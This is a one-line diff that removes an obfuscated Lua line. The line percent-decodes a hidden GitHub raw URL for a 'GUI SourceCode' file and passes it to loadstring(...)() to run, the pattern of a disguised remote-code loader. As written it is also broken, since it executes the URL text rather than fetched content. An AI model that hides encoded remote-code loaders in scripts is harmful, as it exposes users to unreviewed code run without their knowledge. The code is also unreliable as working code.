@@ -1,1 +1,0 @@
-function decodeChar(hex) return string.char(tonumber(hex,16)) end function decodeString(str) local output, t = string.gsub(str,"%%(%x%x)",decodeChar) return output end;loadstring(decodeString("https%3A%2F%2Fraw%2Egithubusercontent%2Ecom%2FTheRealffuzion%2FProjects%2Frefs%2Fheads%2Fmain%2FGUI%2520SourceCode"))()
